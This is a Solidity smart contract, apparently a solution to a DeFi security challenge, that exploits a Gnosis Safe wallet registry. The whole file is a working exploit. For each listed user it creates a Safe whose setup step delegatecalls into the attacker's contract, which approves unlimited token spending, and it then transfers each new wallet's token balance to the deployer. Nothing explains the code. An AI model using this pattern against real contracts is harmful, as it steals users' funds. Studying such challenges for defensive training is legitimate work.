// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "hardhat/console.sol";

interface IGnosisFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        address callback
    ) external returns (address proxy);
}

contract BackdoorExploit {
    IGnosisFactory _factory;
    IERC20 _token;

    address _registry;
    address[] _users;

    address _owner;

    constructor(
        IGnosisFactory factory_,
        IERC20 token_,
        address registry_,
        address[] memory users_
    ) {
        _factory = factory_;
        _token = token_;
        _registry = registry_;
        _users = users_;
        _owner = msg.sender;
    }

    function attack(address _singleton) external {
        // function setup(
        //     address[] calldata _owners,
        //     uint256 _threshold,
        //     address to,
        //     bytes calldata data,
        //     address fallbackHandler,
        //     address paymentToken,
        //     uint256 payment,
        //     address payable paymentReceiver
        // )

        bytes memory attackCallback = abi.encodeWithSignature(
            "attackDelegateCall(address,address)",
            address(_token),
            address(this)
        );
        for (uint256 i = 0; i < _users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = _users[i];
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                attackCallback,
                address(0),
                address(0),
                0,
                address(0)
            );
            address proxy = _factory.createProxyWithCallback(
                _singleton,
                initializer,
                i,
                _registry
            );
            _token.transferFrom(proxy, _owner, _token.balanceOf(proxy));
        }
    }

    function attackDelegateCall(address token_, address spender_) external {
        IERC20(token_).approve(spender_, type(uint256).max);
    }

    receive() external payable {}
}
